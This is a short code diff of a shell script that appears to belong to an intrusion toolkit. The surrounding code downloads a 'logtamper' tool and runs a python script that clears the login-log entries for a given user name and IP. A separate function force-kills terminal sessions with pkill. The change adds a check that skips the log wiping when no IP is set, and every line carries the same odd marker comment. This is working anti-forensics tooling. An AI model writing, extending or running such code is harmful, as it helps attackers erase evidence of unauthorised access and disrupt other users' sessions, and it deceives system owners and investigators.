@@ -32,6 +32,7 @@ if [ !  -f $clear_shell ];then  #_fdsagadsfasdgadsgsss
     gglog "Download logtamper ok"  #_fdsagadsfasdgadsgsss
 fi  #_fdsagadsfasdgadsgsss
 function CL {  #_fdsagadsfasdgadsgsss
+  if [[ $my_ip != "" ]];then #_fdsagadsfasdgadsgsss
   if [ -f $clear_shell ];then  #_fdsagadsfasdgadsgsss
   	  gglog "clear $my_name $ip_one"  #_fdsagadsfasdgadsgsss
       python $clear_shell -m 2 -u $my_name -i $my_ip ;  #_fdsagadsfasdgadsgsss
@@ -39,6 +40,9 @@ function CL {  #_fdsagadsfasdgadsgsss
   else  #_fdsagadsfasdgadsgsss
   	gglog "no cl to found"  #_fdsagadsfasdgadsgsss
   fi  #_fdsagadsfasdgadsgsss
+  else #_fdsagadsfasdgadsgsss
+    gglog "no need to clear login log" #_fdsagadsfasdgadsgsss
+  fi #_fdsagadsfasdgadsgsss
 }  #_fdsagadsfasdgadsgsss
 function  _ki { #_fdsagadsfasdgadsgsss
   pkill -9 -t $1  #_fdsagadsfasdgadsgsss
